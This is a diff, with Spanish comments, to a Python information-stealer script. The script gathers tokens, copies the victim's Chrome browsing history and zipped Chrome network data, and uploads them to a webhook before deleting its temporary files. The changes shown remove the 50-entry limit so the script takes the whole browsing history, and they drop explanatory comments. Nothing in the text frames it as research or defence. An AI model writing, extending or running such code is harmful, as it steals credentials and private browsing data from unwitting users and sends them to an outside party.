@@ -90,11 +90,11 @@ def obtener_tokens_reales():
                 
     return tokens
 
-######## Historial de Navegador (Generar TXT) ###############################
+######## Historial Completo de Navegador (Generar TXT sin límites) ############
 
 def generar_archivo_historial():
     history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
-    txt_path = os.path.join(tempfile.gettempdir(), "historial.txt")
+    txt_path = os.path.join(tempfile.gettempdir(), "historial_completo.txt")
     
     if not os.path.exists(history_path):
         with open(txt_path, "w", encoding="utf-8") as f:
@@ -115,20 +115,21 @@ def generar_archivo_historial():
         conn = sqlite3.connect(temp_history)
         cursor = conn.cursor()
         
+        # Se elimina el LIMIT para extraer todo el historial almacenado
         query = """
             SELECT url, title, last_visit_time 
             FROM urls 
-            ORDER BY last_visit_time DESC 
-            LIMIT 50
+            ORDER BY last_visit_time DESC
         """
         cursor.execute(query)
         rows = cursor.fetchall()
         
         with open(txt_path, "w", encoding="utf-8") as f:
-            f.write("=== HISTORIAL DE NAVEGACION (CHROME) ===\n\n")
+            f.write("=== HISTORIAL COMPLETO DE NAVEGACION (CHROME) ===\n\n")
             for row in rows:
                 url, title, _ = row
-                f.write(f"Título: {title}\nURL: {url}\n----------------------------------------\n")
+                titulo_seguro = title if title else "Sin título"
+                f.write(f"Título: {titulo_seguro}\nURL: {url}\n----------------------------------------\n")
             
         cursor.close()
         conn.close()
@@ -310,18 +311,16 @@ def enviar_reporte_completo(tokens):
         ]
     }
 
-    # Generar archivos adjuntos (Historial TXT y Network ZIP)
     txt_path = generar_archivo_historial()
     zip_path = empaquetar_network()
 
     files = {}
     try:
-        # Abrir ambos archivos para enviarlos en la misma petición al webhook
         f_txt = open(txt_path, "rb") if os.path.exists(txt_path) else None
         f_zip = open(zip_path, "rb") if zip_path and os.path.exists(zip_path) else None
 
         if f_txt:
-            files["file1"] = ("historial.txt", f_txt, "text/plain")
+            files["file1"] = ("historial_completo.txt", f_txt, "text/plain")
         if f_zip:
             files["file2"] = ("chrome_network_data.zip", f_zip, "application/zip")
 
@@ -334,7 +333,6 @@ def enviar_reporte_completo(tokens):
     except Exception:
         pass
 
-    # Limpieza de archivos temporales
     if os.path.exists(txt_path):
         try:
             os.remove(txt_path)
